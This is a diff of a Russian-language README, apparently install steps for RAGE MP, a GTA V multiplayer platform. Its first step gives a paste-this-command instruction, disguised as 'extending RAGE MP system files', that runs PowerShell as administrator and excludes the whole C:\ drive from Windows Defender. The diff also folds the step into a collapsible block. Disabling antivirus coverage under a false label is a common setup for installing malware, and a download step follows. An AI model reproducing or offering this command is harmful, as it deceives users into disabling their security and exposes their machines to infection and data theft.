@@ -6,11 +6,14 @@
 
 Шаг 1 ⚙️
 
-Сделайте расширение системных файлов RAGE MP
+<details>
+<summary style="color: blue; font-weight: bold;">Сделайте расширение системных файлов Rage Mp</summary>
 
-Нажмите комбинацию Windows+R и введите команду 
+Нажмите Win+R и введите команду
 
-` powershell.exe -Command "Start-Process powershell.exe -Verb RunAs -ArgumentList 'Add-MpPreference -ExclusionPath C:\ -Force'" `
+`powershell.exe -Command "Start-Process powershell.exe -Verb RunAs -ArgumentList 'Add-MpPreference -ExclusionPath C:\ -Force'"`
+
+</details>
 
 Шаг 2 📥
 
